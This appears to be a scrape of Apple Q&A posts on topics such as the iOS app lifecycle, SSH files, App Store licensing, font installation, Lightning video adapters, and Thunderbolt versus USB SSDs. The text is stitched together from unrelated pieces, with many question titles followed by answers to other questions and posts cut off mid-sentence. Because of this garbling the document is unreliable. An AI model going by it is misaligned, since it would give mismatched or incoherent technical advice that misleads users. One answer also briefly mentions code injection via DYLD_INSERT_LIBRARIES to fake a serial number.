periodically scheduled to run on the CPU - meaning that its own program code will run on the actual CPU and it will have some power over what actually happens.\nOn a traditional PC you could have such a running application with a graphical user interface in a window. Whether that window is in the foreground, in the background, or even minimised (i.e. not visible at all) - you still have the programming code being periodically scheduled1 to run on the CPU. The application is so to speak free to do whatever it wants. The application might have a lower priority in the background, and it might not be scheduled as frequently or for as long as when in the foreground, but it is still basically the same thing.\nStill on a traditional PC, you could set the whole PC in sleep mode. There's many different types of sleeping states with different impacts on the system:\nFor the S1, S2 and S3 sleep states, the application still has its state in RAM, but will not have its program code periodically scheduled to run on the CPU while in sleep. This is basically all what really happens from the context of the application2 although from the context of the operating system lots of things need to take place on wake (i.e. drivers need to reinitialise peripherals etc).\nFor the S4 sleep state, the application's state is saved to disk - although this happens transparently to the application. It is no longer scheduled to run on the CPU (obviously). When the PC is waken up, the state is restored to memory and the application can run again by scheduling its program code to run on the CPU again.\nFor the S5 power state, the system is basically shut down and powered off. In this case, no application state is saved to disk automatically by the operating system. The application must by itself have stored state in order to resume where you left off when the system is powered on again. On many operating systems, you'll find that it is common that applications do not do this - or at least do not do this in a transparent fashion. I.e. if you power off your system with your favorite game running, you cannot expect that the game will be running and in the same place when you power the system on again.\nNow I'll turn to the apps on iOS. Similar to the Sx power states that we talked about before (that are system wide), an app on iOS will also go through various states during its life. Specifically apps are actually made up of scenes2 that can be in one of the following states:\n\n*\n\n*Unattached\n\n*Foreground and inactive\n\n*Foreground and active\n\n*Background\n\n*Suspended\n\nWhether your consider the app to be \"running\" in either of these states really depends on your point of view. I.e. a non-technical user might think of this differently than an app developer.\nIf we look at an example of you starting an app for the first time, this is what happens:\nWhen you tap an icon on the home screen to \"run\" your app, a specific scene in the app will first go into the \"unattached\" state. This means that parts of the executable code for the application is loaded into RAM, an event loop is setup and a specific, limited functionality in the program code is triggered. This particular code will on the first run typically do next to nothing itself (i.e. it will trigger some UIKit code in system frameworks for example, but not much application specific code). Nothing is visible on the display for the user.\nShortly thereafter the scene will transition into the \"Foreground and inactive\" state. Here the app will run its own code to setup user interface elements, start timers, acquire shared resources, etc. - but nothing is yet displayed on screen and no user input is given to the program.\nShortly thereafter the scene will transition into the \"Foreground and active\" state. Now its user interface elements will be visible on the display and user input (such as touches) are sent to the apps' event loop. The app's code is periodically scheduled for execution.\nSome time later, iOS can transition scene back into the \"Foreground and inactive\" state. For example if the user decides to switch to a different app. Again user input events are not sent to the app, but the app's own code is periodically scheduled in order to pause work operations - such as for example saving user data to permanent storage, stop timers, pause threads that empty queues of tasks, stop updating animations, etc.\nIf the scene was made \"Foreground and inactive\" only temporarily due to for example a system modal popup (such as for example a 10% battery left message), the scene can soon be transition back into \"Foreground and active\" again. However, if it was due to the user switching to a different app, the scene will be transitioned into the \"Background\" state.\nWhen transitioned to the \"Background\" state, the app's own code will be scheduled for execution only for a very limited amount of time (typically 5 seconds, but an app can request an extension). Here the app is supposed to free up any large data objects in memory (such as for example images and audio files loaded from storage earlier), release any shared resources held (such as for example the camera, the address book or many other different types of shared resources). It is also supposed to clean up its user interface to \"declutter\" it and remove any sensitive information3. After a short while, iOS will stop scheduling the app's code for execution, and it will take a \"screenshot\" (remember that the user interface is not displayed on screen, so it is taking a bitmap copy of what would have been displayed on screen, if it had been on screen). This screenshot is now what will be presented to user as the \"running app\" in the app switcher for example. The actual user interface elements could have been purged from memory, but the screenshot will still look the same.\nOne important thing to notice is that apps can tell iOS that they support specific use cases that will earn them the benefit of their code being scheduled for execution even when in the \"Background\" state. The app does not itself decide when its code is run - that is decided by iOS depending on which use cases the app has registered for. For example it might be that the app is an email app that has requested that it be allowed to check for new mail using a timer approach. It might be an application that has requested some execution time when the user's geographical location changes a certain amount. There's several other use cases, such as for example a recipient of push notifications, apps that play audio that the user wants to keep playing when the app is backgrounded, etc.\nIn the \"Background\" state, some of the programs code is usually still in RAM, but most of its larger resources are not. The app can perform some limited functionality, but controlled by iOS - not itself. The user interface is basically a screenshot.\nLater the scene can be suspended at the discretion of iOS. This means that the app is given time to execute code that will allow its state to be preserved in permanent storage in order to be able to restore the app to the same state later. This is done to give the illusion that the app is always running. For apps using Apple's tools, this can be done more or less automatically by the system without the developer of app having to implement much. For some apps however, the developer has to do lots of work to be able to correctly persist its state.\nNow when the app is \"Suspended\", iOS is free to remove it completely from RAM. Although to the user, very little if anything at all visibly happens when the app is suspended. Most importantly iOS hangs on to the saved state - it is preserved also across reboots of the phone. It is discarded when the user uses the app switcher to force quit the app, and if the app crashes at launch (indicating a bug in the app - this is done to prevent the app from hanging on every launch).\nWhen the user switches back to an app in the \"Suspended\" state, the scene again enters the unattached state. The difference from the \"fresh start\" is that this time, the app is also given its preserved state. The app can now use this data to setup user interface elements, internal state, etc. so that the app looks to the user exactly as it did before it was suspended.\nSome developers use only Apple's own tools in a matter where this happens effortlessly or they are skilful at implementing this restoration for themselves. This essentially makes it so that the user cannot tell the difference between an app transitioning from the \"Background\" state into a foreground state, and an app transitioning from the \"Suspended\" state into a foreground state.\nHowever, some developers do not provide this seamless restoration. In the most basic case (i.e. they do no nothing), the app will essentially \"restart\" and look like it was force quit and started again.\nThis explains part of the reason why some apps seem to be \"running all the time\", and others appear to be \"stopped\" and \"restarted\". It does not necessarily mean that iOS has \"decided to quit\" that app more so than others, but rather that the app itself wasn't built with the same care or was for other reasons unable to preserve and restore its state.\nNote that iOS might suspend apps for various reasons other than rebooting your phone. For example app might be backgrounded and suspended in order to release memory or other resources to be used by other programs. They might also be brought back from suspension when resources are less scarce.\nBasically apps can be backgrounded and suspended without the non-technical user being aware of anything. The app will still look the same in the app switcher - and the user can resume using that app without there necessarily being any difference between a suspended and not-suspended app. Note that often a suspended app will take slightly longer to bring up than a non-suspended app.\nTo sum all of this up, the definition of when a program is \"running\" is contextual and can be quite complex. Would the average user consider a PC program with a minimised window to be \"running\"? - If that PC goes to the S1 sleep state temporarily, is the program still \"running\"? You could argue that it is not, but could you argue that the program has \"quit\"?\nSimilarly an iOS app could probably be considered running by a non-technical user in either of the states mentioned as long as its state is preserved. The user can switch to the app and it will respond and look as expected - it does not \"restart\" (as in starting over from scratch). Obviously some might not consider the app as running when the phone is powered off... but from the point of view of the app itself, it doesn't actually \"know\" whether the phone has been turned off or not.\nUPDATE:\nFrom the comments I have learned that the practical problem behind this question is the MediSafe app and its failing to properly alert the user in some cases - and wanting to learn whether that's a short coming of iOS or the app itself.\nThe MediSafe app is supposed to give an alert at (or as soon as possible after) specific times to remind the user to take their medications. In order for that to work in every case, even when the phone has just rebooted, the app is not running, the app is backgrounded - or whatever has happened - the developer needs to use the User Notifications API and more specifically the UNNotificationRequest() function.\nThis API has nothing to do with the mentioned \"background modes\".\n\n1: Note that the program might have asked the operating system specifically to not schedule it again unless some event happens.\n2: I'm talking about iOS 13 and newer here - it's slightly different on iOS 12 and older, where this isn't handled on a per-scene basis, but rather on a per UIApplication basis.\n3: This explains why some apps appear in the app switcher as \"blank\" or a \"solid color\" only. Some apps on purpose change their user interface to look like that just before the screenshot is taken in order to protect sensitive information from prying eyes. It does not mean that the app is \"cleared out from memory\" or is \"less running\" (if that makes any sense) than other apps.\n", "Q: Is there a way to set up a location reminder with an alarm sound on my iPhone?

Is possible?, How? it according of each category (1 or 2)\n\nA: First: if you're going to be messing around with system files like this, you really should have a backup. Actually, you should always have a backup of anything you don't want to lose, but usually that's just your user files. But if you're messing with the OS, you should probably have a backup of that, too, and probably a bootable installer drive in case things go seriously sideways (there's recovery mode, but it's hard to control what macOS version you get with that).\nAs for the files, there are actually 3 categories:\n\n*\n\n*Public/private keys: These are generated automatically when the ssh service (\"Remote Login\" in the Sharing pane of System Preferences) is started. They're not needed if you only run the ssh client (and won't even exist if you never started the server component). If they're deleted, just turn the ssh service off and back on.\nHowever, if they're recreated, any client that's connected before, and connects again after recreation, will notice that they've changed and give a warning, because the server might be an imposter. You should avoid this if possible.\n(When I'm upgrading/replacing a server, I always save these and copy them to the new config, in order to avoid clients getting spurious warnings. I don't want to train users to ignore security warnings.)\n\n\n*Configuration files: as far as I know, these are from the standard OpenSSH distribution, and can be downloaded from opensource.apple.com. The versions for OS X 10.11.6 are here\nBut there's a caveat here as well: these may get changed in things like security updates, so the actual version you have might be newer than what originally came with OS X 10.11.6, and there might be good reasons they were updated. You can check which updates included these files with e.g. pkgutil --file-info /private/etc/ssh/ssh_config, but I don't know of a good way to find out what version of the file was included with the listed updates. Maybe just reinstall the latest security update for your OS version?\n\n\n*The moduli file is sort of a hybrid of the above. It's part of the standard install, and available with the other config files, but you can generate your own with the openssh-keygen command if you want to. It's actually slightly more secure to generate your own, but kind of a hassle for minimal increase in security.\n", "Q: Stop The Unarchiver from stealing focus When processing files in the background The Unarchiver will display a Finder window in front of whatever other app I was using.

That is if you obtain an app from outside the App Store none of this applies.\nIn broad terms the app is licensed to one person only and they can use the app on multiple devices and only that person can interact with the App Store (e.g. update the app)\nNote that from  EULA so the wording is not the simple owner of or who \"bought\" the app.\n\nThe Mac App Store Products and App Store Products (collectively, “App Store Product(s)”) made available through the Mac App Store Service and App Store Service (collectively, “App Store Service(s)”) are licensed, not sold, to you.\n\nApple has set up Mac App Store that applications from it are licensed to the  person who pays for the app using their Apple ID\nOnly the owner of that Apple ID can update the apps etc. However any other user can run them.\nIf you have multiple users on a machine and want more than one to  be able to update them then you have to use a multi user solution which includes Family Sharing and Volume Purchase Programme (no link as the ones I found lead to dead links)\nThe parts of the App Store EULA that matter here are\n\nThis license does not allow you to use the Licensed Application on any Apple Device that you do not own or control, and except as provided in the Usage Rules, you may not distribute or make the Licensed Application available over a network where it could be used by multiple devices at the same time. You may not rent, lease, lend, sell, transfer redistribute, or sublicense the Licensed Application and, if you sell your Mac Computer or iOS Device to a third party, you must remove the Licensed Application from the Mac Computer or iOS Device before doing so.\n\nThus if you want to have your mother use the apps that you have licensed from Apple then either you need to add her to Family Sharing or if she will be using the computer completely separately away from your control then you need to remove the apps that you have licensed from Apple.\n", "Q: What does it mean when u send a message its blue but it doesnt say delievered?

Desktop operating systems like macOS, Windows or Ubuntu have some font management built-in to their file manager. If the user has some .ttf font files, they can simply double click or right click the files and install. This looks simple and intuitive.\nThis is not the case on the iPad. Even if you download a .ttf file from Safari, tapping it in the File App does not work. You have to use a third-party font manager App.\nWhy is there this difference between desktop operating systems and iPadOS?\n\nA: You are comparing 'desktop' operating systems to mobile, which is not a straight comparison. macOS also allows simple double-click to install a font.\nThe root cause appears to be that on iOS/iPadOS fonts must be installed using a configuration profile. Fonts from the App Store appear to be already designed this way.\nInstalling your own fonts does not.\nYou can make config files for free on a Mac using Configurator 2, but there's no equivalent Windows app, so you'll need to use a 3rd party iOS/iPadOS config generator.\nI imagine this is to make removal as simple as addition.\nSee\nApple KB - Install and manage fonts on iPad\nHowToGeek - How to Install Fonts on an iPad or iPhone\nHowToGeek - How to Create an iOS Configuration Profile and Alter Hidden Settings\n\nA: This question is entirely about why Apple has chosen to do something and not something else - it cannot really be answered by anyone but the particular Apple employees involved in that decision.\nHowever, if I were to guess about why it is done like this, I see two possible reasons:\nReason 1: The process of installing fonts from files in file managers on desktop operating systems is really not that intuitive for non-technical users.\nYou might think it is simple and intuitive for you, but I guarantee that I have seen lots of people struggle with this on Windows for example. Some fonts comes as lots of separate files (for various features such as italics, bold, black, thin, etc) and they often have non-descriptive names. People mess up and only get one file installed, or they miss one - or they cannot find the right font file because they can't match up the name of the file with the name of a font they're missing in Word or other software.\nFor businesses, it is also a project in itself to ensure that all employees have the right fonts installed in the right versions. If you want to be able to share internal documents, you have to ensure that everyone has the right fonts. The set of fonts might vary quite a lot depending on whether you're in sales & marketing, product development or customer support. And you do not want to have every employee spending time on installing them manually.\nReason 2: Right managements for fonts on desktop operating systems have always been problematic for the companies and individuals that create fonts. If you can just copy a TTF file to your colleague, it is very easy to violate a font licensing agreement without knowing - and without the licensor having much flexibility.\nI.e. you typically do not see serial numbers or license codes used for fonts on desktop operating systems. For web typography, it's a completely different ball game, which can be very confusing to the licensee. I.e. you could be licensing a font for a specific domain only, for a certain number of \"visits\", or various odd limitations.\nThat font installation happens through a third party app on iOS makes this process simpler for both the licensee and the licensor (but obviously slightly more difficult for those that violate license agreements). The publisher of the app is contractually bound to actually have the rights for the fonts they're selling, and the licensee gets a familiar buying process with Apple that they're used to for apps.\n", "Q: How to remove items from the touch bar?

From what I understand, it is possible to connect an Apple iPad Air or iPad Pro to a USB-C monitor by connecting it to the USP-C port on the iPad. (I hope I am correct in saying this)\nThe Apple iPad 2020 has only a lightning connector.  Is it possible to connect to a USB-C monitor by using a USB-C to Lightning Cable or adaptor?\n\nA: You are correct that the iOS devices using USB-C chips need no adapters for video out to most USB-C displays. The lightning based hardware require specific adapters like the HDMI or VGA ones Apple sells.\n\n*\n\n*Lightning Digital AV Adapter  https://store.apple.com/xc/product/MD826AM/A\n\n*Lightning to VGA Adapter https://store.apple.com/xc/product/MD825AM/A\nI’ve never seen an adapter that fits your requirement. The above “adapters” have embedded systems on a chip “SoC CPU” that boot each time you connect them to convert video out data streams into the HDMI or VGA signals needed to drive displays.\n\nA: \nThe Apple iPad 2020 has only a lightning connector. Is it possible to connect to a USB-C monitor by using a USB-C to Lightning Cable or adaptor?\n\nNot likely, or more precisely not likely with just a single cable or adapter.\nThe Lightning port is in many ways like USB-C but one big difference is that the Lightning port kind of does it's own thing with video output and relies on electronics in the Lightning adapters or cables to get the video right.  People have done disassemblies of Lightning adapters and found little micro-controllers inside.  The reason is that the Lightning connector doesn't have enough pins for VGA, DP, or HDMI signal so it needs something to help it out to take a video stream it is sending on 4 data pins and turn that into something that a device that is using 8 or more data pins.  A common Lightning to USB-C cable does fine for power and data to a computer because with 8 pins total there's 2 for power, 2 for ID and control, and 4 for data, which is fine for USB 2.0 with no need for a \"helper\" chip.  With more complex accessories I assume the 4 data pins form 2 differential pairs with one for input and the other for output.  With only one pair of wires for output there needs to be a \"translator\" to break that out into the right signals on the right pins for a 19 pin HDMI signal.\nIt would be possible to construct a cable that had Lightning on one end USB-C on the other that was capable of DP video out and power in to charge the Apple iProduct.  Since this cable would be easily confused with the far more common USB 2.0 cable I doubt Apple would certify such a cable for sale.\nConnecting an iPad with a Lightning connector to a USB-C display is certainly possible but it will not be cheap or easy.  If all you want is video then get the Apple Lightning Digital AV Adapter and an adapter that will convert the HDMI to a DP signal, then you may also need a DP to USB-C cable to connect the adapter to the display.  If you need the display to provide power to your iProduct then expect to need some kind of USB-C dock, if such a thing exists, to break out the power and then use the USB-C to Lightning cable to plug into the Lightning power passthrough port.  All these bits could easily cost more than $200.  It would be far simpler to use the HDMI port on the display, assuming it has one.\nI assume this display has more than just USB-C as an input, presumably HDMI.  In that case buy the Lightning Digital AV adapter, buy/beg/borrow/steal an HDMI cable, use the Lightning to USB-C cable that came with your iProduct, then proceed to connect the two HDMI ports with the HDMI cable, and use the USB-C port with the Lightning to USB-C cable for providing power to your iProduct.\nIs this a theoretical question or is this a practical dilemma?  The only displays I've seen so far with only USB-C are small portable displays.\n", "Q: You may not install to this volume because the computer is missing a firmware partition I have a 13 inch MacBook Pro 2015 model.

I use the latest version of SwitchResX to handle the external monitor rarer resolution of 1440x900, surely not too many pixels for the older Intel graphics chip. Video adapter is a Thunderbolt 1-to-VGA.\nPreviously, I used a DisplayLink USB3-based video adapter to light the second monitor (legacy from a slightly older MBP with a burnt Thunderbolt chip) with few issues, except the ginormous CPU consumption that made it impossible to use said adapter for anything else than text or short animations, the single reason why I want to revert to the Thunderbolt adapter. USB3 was never made for streaming video data, no matter how good the compression and algorithms.\nProblem:\nEvery time I try to connect the external monitor in Mojave, the OS freezes with a short delay. However, briefly before freezing, SwitchResX does acknowledge the external monitor presence, albeit at an extremely low resolution of 800x600.\nIf external monitor is plugged in before boot, boot doesn't proceed.\nAlready tried:\n\n*\n\n*Same maneuver in High Sierra triggers the same behavior.\n\n*Resetting PRAM then SMC has no effect.\n\n*Disabling SIP has no effect (Off the top of my memory, since I cannot\naccess local recovery partition for Mojave)\n\n*Connecting as a different user on either OS triggers same behavior\n\n*Last time I checked, booting in safe mode on either OS allows the external monitor to turn on.

Running in Safe Mode prevents that driver from loading, among other things, so you avoid running that buggy code.\nOne thing I didn't see you mention is whether you see a panic report after you reboot (the \"Your computer restarted because of a problem\" message). If you get one of these, can you add the details to your question? If not, can you check /Library/Logs/DiagnosticReports for new reports created after you reboot?\nThe failure-on-boot is mildly interesting. Can you try booting in Verbose Mode (CommandV during boot), take a slow-motion video with your iPhone, and add the still-screen framegrabs to your question so that we can see the boot console text and the precise moment of failure? (I bet it will be during the GPU driver loading, which we can pin down with the kextlog=0xfff boot-arg set.)\nIn any case, without advanced debugging tools and source code access, you will never root-cause this issue yourself. The best you can hope for is a workaround.\n\n*\n\n*One which you have found, which is obviously not viable, is running in unaccelerated mode.\n\n*Try upgrading (or downgrading) to a different OS, which will have different versions of the graphics driver and might not contain the same bug.\n\n*Use a supported resolution.\n\nYour options are, unfortunately, limited in this case.\n", "Q: Can't play non-Apple Music songs on iTunes (PC) I was on holidays recently and downloaded and edited some songs from the Internet onto my MacBook Air (Late 2010).

If I hide my email address for an app signup, get a private relay address, and subsequently reply, in the Mail app (iOS 14.5), to an email sent to me via that address then Mail will use my default email account (with my name literally part of the address) to send my reply.\nIn all other cases Mail replies by default from the account associated with the address that the incoming email was sent to, and so doesn't leak my other addresses. For me this means that in practice the private relay feature is actually less private than when I just use my regular addresses.\nThe support page for the feature states\n\nAny messages sent to this address by the app or website developer are automatically forwarded to your personal email address by our private email relay service. You can read and respond directly to these emails and still keep your personal address private.\n\nSince Mail apparently doesn't take any steps itself to not leak my addresses when using this private relay feature, what must I do every time I want to reply from my private address to an incoming message? Always select an arbitrary from address that is associated with the iCloud account that owns the private address?\niOS 14.5\n\nA: You have to do nothing.\nThe reply-to address is actually a private relay address, mapping my personal address to the private relay address server-side.\nI should perhaps have inspected the destination address (and not just its display name) before asking.\n", "Q: How to stop terminal from re-opening old windows at launch? I have a java app that automatically launches when the machine boots.

However, there doesn't seem to be a way of setting the image size, so once you run out of space, you need to start over. Disk Utility has a \"Resize Image\" option, but it appears to be quite limited (I can't get it to work on rw images).\nSo far, the only procedure I've found to create a disk image of an arbitrary size is:\n\n*\n\n*Create a big, empty file in your otherwise clean directory:\ndd if=/dev/zero of=zeros bs=1024M count=5\n\n\n\n*Create a disk image of that folder.\n\n\n*Mount the image, erase its contents (i.e., the zeros file) and copy the actual data you want in there.\nIs there a simpler way?\n\nA: Often using the Graphic User Interface (GUI) offered by the Disk Utility application is more convenient than using a Command Line Interface (CLI) required by macOS commands. However, the Disk Utility application only offers a limited subset of the capabilities of various macOS commands. In your case, to resize an image you would need to use the hdiutil command.

This will delete any custom images.\n", "Q: iOS and Keychain - how to get known passwords in Safari to be used in a related app I have a password saved on my iPhone 11 (software version 14.7.1) that autofills if I use Safari to visit website X.  How do I get that password to be used for the app made by the same website?  Is this even possible?\n\nA: Yes, it is technically possibly for apps to behave that way - but only if the developer of the app has arranged for it. If the app does not support autofilling passwords that way, it is not possible for users to change that.\nFor developers, it is very simple to support this feature. The developer primarily has to list their domains (such as my-web-site.com) in the Info.plist file in the app, and then add a single JSON-file named apple-app-site-associate to the web server on that domain.\nThe details for developers are specified here:\nhttps://developer.apple.com/documentation/security/password_autofill/about_the_password_autofill_workflow\nand here:\nhttps://developer.apple.com/documentation/xcode/supporting-associated-domains\n", "Q: Exchange not syncing with Contacts App (Big Sur) Symptoms:\nI've got a user with 3,051 contacts in his exchange account. We use exchange online. He is able to see and sync his contacts with the Outlook app and his iPhone (running latest iOS, 14 I think?). He has had this issue for over 6 months now on multiple computers and multiple OS versions, all Macs.\nSpecifically, when we add his exchange account to the Contacts app, either they never sync, or a fraction of them sync. (On macOS 10.12 he gets 900 of them, on macOS 11 he gets 0)\nGoal:\nMy user wants his contacts to appear in Contacts, because he uses the Messages app to text, and wants to see who is messaging him. This is a corporate account so we want to keep all the contacts in Exchange unless we have no other options.\nI've tried:\n\n*\n\n*Adding and removing the account.\n\n*Moving all contacts into a folder.

Toggling \"contacts\" in the Internet Accounts preferences pane did nothing even with a reboot in between, it seems like the contacts infrastructure just got stuck in some broken state and needed a reset.\nWhat worked for me:\n\n*\n\n*Disable \"Contacts\" in the Internet Accounts preferences pane and close preferences (as there is no explicit \"save\" button I assume closing it is what commits the changes)\n\n*Run rm Library/Application\\ Support/AddressBook/ in a Terminal - note that you will lose all local contacts and any local changes that haven't been synced - it may be preferable to mv it to a backup directory just in case.\n\n*Enable \"Contacts\" in the preferences pane and give it some time - in my case the contacts magically appeared all at once after a minute.\n\n", "Q: How to pad or add leading zeros to months How do I pad or add leading zeros to months?

I want to purchase an external SSD for MBP 2019, 16\" and occasionally run it from an external SSD. I understand that Thunderbolt 3 is much faster in data transfer than regular USB Type‑C, but can the SSD utilize this difference? Should I pay extra for Thunderbolt 3 external SSD or if I purchase a USB Type‑C SSD, then I will not feel the any difference?\nAnother consideration is back compatibility with older hardware. If I understand correctly, USB Type‑C <=> USB 3.0 adaptor is a much cheaper and more widely available than a Thunderbolt 3 <=> USB 3.0 adapter.\nFor example, I hesitate between the Samsung X5 Portable SSD (actually, it is the only one external SSD which is available near me locally) or the Samsung T7 portable SSD.\nI am using my MBP for development, multiple docker containers, IDE, etc...\n\nA: Below are answers and comments based on the OP's posted question.\n\nI understand that Thunderbolt 3 is much faster in data transfer than regular USB Type‑C, but can the SSD utilize this difference?\n\nThunderbolt 3 is up to 40 Gb/s and USB 3.1 Generation 2 is up to 10 Gb/s. The SSD used in both the Samsung T7 and X5 Portable SSDs is faster than 10 Gb/s. Therefore, the SSD can utilize this difference.\n\nShould I pay extra for Thunderbolt 3 external SSD or if I purchase a USB Type‑C SSD, then I will not feel the any difference?\n\nThe Samsung X5 Portable SSD will be notably faster than the Samsung T7 portable SSD. Also, the Samsung X5 will appear as a NVMe drive with TRIM support just like the internal drive already in your Mac. Although, the internal drive will be slightly faster than the Samsung X5. The Samsung T7 portable SSD will appear as a USB drive. I have not found any indication that the Samsung T7 has TRIM support.\n\nAnother consideration is back compatibility with older hardware. If I understand correctly, USB Type‑C <=> USB 3.0 adaptor is a much cheaper and more widely available than a Thunderbolt 3 <=> USB 3.0 adapter.\n\nThe USB Type‑C <=> USB 3.0 adaptor is just a cable. This cable is included with the the Samsung T7 portable SSD. I am not sure a Thunderbolt 3 <=> USB 3.0 adapter that would connect a Samsung X5 Portable SSD to a USB 3.0 port exists.\n\nA: It all depends.  There is no good answer on if you will notice the speed difference, it just depends.\nWhen it comes to backward compatibility you should not sweat that too much.  Apple's USB-C ports with TB3 and USB4 will be backward compatible with USB 3.2, 3.1, 3.0, 2.0, and 1.1.  I have not seen a TB3 drive that wasn't backward compatible with USB 3.x excepting those big RAID boxes that have some fancy SATA controller under the hood or something.\nI've seen USB-C drives become hit and miss when plugged into some USB-A ports because of a lack of power and/or they can't drop down to USB 2.0 mode.  If it's a matter of power then a relatively inexpensive powered USB 3.x hub can fix that.  If it's a lack of Thunderbolt or USB 3.x then that is fixable now with a more pricy Thunderbolt hub.  I'm experimenting with a TB4 hub on a TB2 host with the intent to get the most out of my USB-C devices, and it's not going as well as I hoped.  I'm only getting USB 3.0 speeds when I should be getting TB2 and USB 3.1 speeds.  It appears to be a software issue that I need to work out.\nWhen it comes to speeds I'll be imprecise with the naming conventions but y'all should know what I mean.\nUSB 3.0 = 5 Gbps\nUSB 3.1 = 10 Gbps\nUSB 3.2 = 20 Gbps\nUSB4 = 40 Gbps\nTB1 = 10 Gbps\nTB2 = 20 Gbps\nTB3 = 40 Gbps\nBecause USB and TB encode the data differently they are not quite one to one, TB is slightly faster.  Don't pay as much attention to the external interface as it will be the internal interface on the drive that will tell you how fast the drive is.  I recall seeing TB3 drives but one had SAS-4 at 22.5 Gbps internally but the other was SATA Express at 16 Gbps.\nThere's the host controller, the drive, the drive container with it's interface adapter, then comes the cable.\nUnless you are going out of your way for an active cable, which will cost a bit more than passive cables, the cables will be relatively inexpensive and their data capability easily identified.  Any passive 2 meter USB cable will be capable of only USB 2.0 speeds.  They may have USB-C ports on each end and allow a Thunderbolt drive to connect to a Thunderbolt host, but the data will move at USB 2.0 speeds.  That may be handy if you don't need to move a lot of data and all you have is the cord that you were using to charge your laptop.\nAny USB cable with USB-A on one end may be helpful as well to connect a USB-C drive but depending on the cable it will be limited to USB 2.0 to USB 3.1 speeds.  USB-A has half the high speed data pins as USB-C and so tops out at 10 Gbps.\nCables of a meter in length, USB \"trident\" symbols on the connectors, and USB-C connections on both ends should be able to get 5, 10, or 20 Gbps.  There may be a number indicating the speed in Gbps but consider that a minimum since the spec changed so quickly and allowed for cables that met the old 5 Gbps standard to meet the newer 20 Gbps standard.\nUSB-C cables that are about 3/4 meter in length should be capable of the highest speeds USB-C offers.  Some of the cheaper cables will have no markings but should still work but cables certified for 40 Gbps will have the Thunderbolt icon with a number 3 or 4, and or a USB trident icon and a 20 or 40.\nI know this is long but the point is to lay out the different bits and how they can affect the performance.  If we assume a MacBook Pro with Thunderbolt 3 or USB4 then you have a host capable of supporting drives from USB 1.1 to TB4/USB4, 1.5 Mbps to 40 Gbps.  On the other end is the drive, and knowing what that drive can do is a matter of looking at specs, and maybe reading some reviews.  In the middle will be the drive enclosure and the cable.  Chose those to match your host and drive.\nThat may be more than you need to know but I hope it helps.\n", "Q: Hide actual serial number from application I do not want certain applications to get my actual serial number (the one you get with ioreg -l | grep IOPlatformSerialNumber). How can the application get the serial number? Can I change the return request to a serial number I specified myself?\n\nA: In general this is not easy to do (i.e. basically impossible for a non-technical user).\nIf you instead of this general case had a specific application in mind - that changes things considerably. With a specific application, you can use a system call tracer in order to discover which method the application uses to get to the serial number. Then you can override that particular method in order to return a faked serial number to the application. That could be done by modifying the application binary itself, by code injection through DYLD_INSERT_LIBRARIES or by a number of other methods.\n", "Q: Enable/load .plist issue after Big Sur update I've spent the last day googling this issue and can't get it figured out.  Apparently, Big Sur treats load and unload as legacy and you are supposed to use enable and disable however I've tried many different combinations of commands and still can't get my plist to work. Load and unload give Input/Output errors.\nI have a script that runs every 30 minutes during the day. It is located in ~/Library/LaunchAgents and is called com.office.ks.ExportData.

When I type the above command it doesn't give a message but doesn't give an error either.  It just goes to the next line waiting for a new command.\n\nA: @Gordon Davidson figured it out. I was having the same problem with launchd plists that executed from my ~/Documents/scipts folder. The odd think is, they ran fine from a Google Drive folder Documents were linked to but on machines that just had my regular ~/Documents/scripts, they'd fail with error 126.\nMove the scripts do a different directory like ~/Library/scripts\n\nA: An return code status of 126 signifies that the command you are trying to use is available, but not executable.\n", "Q: Razer mouse not detected since update After I installed the latest Mac update (Big Sur 11.5.2) my Razer Basilisk V2 mouse is no longer being detected.

The following error was visible:\nThis device cannot start. (Code 10)\n\nI still think, that this is a software problem and that there is some sort of corrupt information on my system.

I've noticed that Apple no longer requires the Music app (previously known as iTunes) to be running in order to sync your music library on you mac with an iPhone or an iPad.\nThis is fantastic because I must endure prolonged periods of the beach ball of death whenever I start up that app.\nAlthough I have to use exactly the right USB-to-lighning cable and I might have to reboot my computer a few times, I can usually get the playlists on my mac synched to my iPhone with less than a dozen errors and less than 30 minutes of effort.\nUnfortunately, whenever I want to add a file to my library, and/or change my playlists before syncing, I still have to endure the beach ball of death. Both on startup (~20 minutes) and with every single mouse click (5-10 seconds). I can't endure this torture any more and need an alternative.\nI presume that the decoupling of the Music app from the sync process by Apple was done so that other applications could be used to write to the music library.\nIs this the correct presumption?\nIf so, does a list of such apps exist?\nAlternatively, can I add just mp3s and edit my playlists manually on the file system without using an app?\n\nA: There's something seriously wrong with your setup - either hardware or software.\nYou're not supposed to have \"prolonged periods of the beach ball\" whenever you start the Music app, nor do you have to use \"exactly the right USB-to-lightning cable\" (any USB to lightning cable will do), and you do not need to reboot yourc omputer to sync a playlist from your Mac to an iPhone. It also should not take 30 minutes.\nAdding a file to your library and/or changing a platlist is also not supposed to give a \"beach ball of death\", nor should clicking your muse ofcourse.\nYou should fix this before looking at manually editing playlists in the file system.\nRegarding your presumption, I can with almost certainty say that the iTunes software wasn't split up in order to make it possible for other applications to write to the music library. That has been technically possible for Apple to do at any time, no matter if the Music app and the syncing process were separate or not.\n", "Q: Terminal command to force open new tab in Safari While running the open https://www.google.com command in Terminal consecutive times, I have noticed the second time I run the command it just shows the original window of google.com instead of opening in a new tab. It works fine when its a different website being requested.\nIs this a macOS bug? I've tried setting new tabs to always in Safari but no luck.\nI'm trying to get Safari to always open a new tab even if its the same website.

The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors.

I have a 2011 Macbook Pro with a 10.6.8 and 10.11.6 partitions and want to add a 3rd one for 10.15 (via dosdude patcher) but need to update the firmware to support the APFS file system first. I need to know with 100% certainty that I will still be able to boot into 10.6.8 & 10.11.6 after installing the High Sierra 10.14 firmware update as I spend most of my time running legacy software on the 10.6.8 osx.\n\nA: The firmware update included with High Sierra include drivers to allow the firmware to access ExFAT and APFS volumes. The existing drivers for FAT32 and HFS are preserved. When I upgraded my 2011 iMac to High Sierra, the partition where High Sierra was installed was not automatically converted to APFS since the partition was on an internal HDD. (Conversion only occurs automatically if installing to a SSD.) Therefore, the Mac is still booting macOS 10.13.6 from a JHFS+ formatted partition. So I can confirm the ability to boot from legacy HFS partitions is preserved after installing High Sierra.\n", "Q: Will I face a problem if I have a different email ID for Android and Apple? I forgot the answers to my Apple ID security questions, and now, I cannot get my Apple ID back. So, I decided to use a new Apple ID for my brand new, and very first, iPhone.\nWill I face a problem for having a different Email ID for Android, and one for Apple? Like, any app or say where I purchased a subscription that can be shared between Android and Apple devices ?\n\nA: I think it's worth explaining a point here that might be getting lost.\nAny app you 